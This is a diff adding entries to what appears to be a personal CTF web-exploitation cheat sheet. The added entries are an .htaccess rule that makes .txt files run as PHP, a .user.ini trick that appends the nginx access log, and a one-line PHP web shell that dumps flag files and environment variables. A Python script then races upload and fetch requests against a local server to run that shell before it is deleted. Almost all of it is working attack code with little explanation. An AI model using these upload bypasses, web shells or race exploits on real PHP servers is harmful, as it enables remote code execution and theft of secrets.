@@ -129,3 +129,80 @@ D:\Environment\php\php-8.4.13\php.exe -d phar.readonly=0 D:\Work\test\php\1\main
 ```shell
 gzip phar.phar
 ```
+
+
+
+# .htaccess
+
+```apache
+AddType application/x-httpd-php .txt
+```
+
+
+
+# .user.ini
+
+```shell
+auto_append_file=/var/log/nginx/access.log 
+```
+
+
+
+
+
+# txt.php
+
+## 窗口竞争
+
+```shell
+<?php $o=shell_exec('cat /f* 2>&1;env');@file_put_contents(__DIR__.'/o.txt',$o);echo $o; ?>
+```
+
+
+
+# txt.py
+
+## 窗口竞争
+
+```python
+import threading
+import requests
+
+uri = "http://127.0.0.1:1938"
+payload = b"<?php $o=shell_exec('cat /f* 2>&1');@file_put_contents(__DIR__.'/o.txt',$o);echo $o; ?>"
+
+hit = threading.Event()
+
+def upload():
+    while not hit.is_set():
+        try:
+            requests.post(uri + "/submit",
+                          files={"file": ("txt.php", payload)},
+                          timeout=5)
+        except requests.RequestException:
+            pass
+
+
+def fetch():
+    while not hit.is_set():
+        try:
+            r = requests.get(uri + "/private/txt.php",
+                             timeout=5)
+            if r.status_code == 200:
+                print("[+] hit!\n" + r.text)
+                hit.set()
+        except requests.RequestException:
+            pass
+
+
+threads = [threading.Thread(target=upload),
+           threading.Thread(target=fetch),
+           threading.Thread(target=fetch)]
+
+for t in threads:
+    t.start()
+for t in threads:
+    t.join()
+
+print("[*] o.txt:\n" + requests.get(uri + "/private/o.txt", timeout=5).text)
+```
